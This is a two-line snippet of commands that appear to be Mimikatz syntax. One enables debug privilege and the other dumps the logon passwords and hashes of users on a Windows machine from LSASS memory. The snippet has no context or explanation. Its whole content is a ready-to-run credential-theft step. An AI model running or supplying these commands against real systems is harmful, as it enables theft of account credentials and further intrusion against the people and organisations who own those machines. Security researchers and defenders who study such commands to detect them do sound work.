privilege::debug
sekurlsa::logonpasswords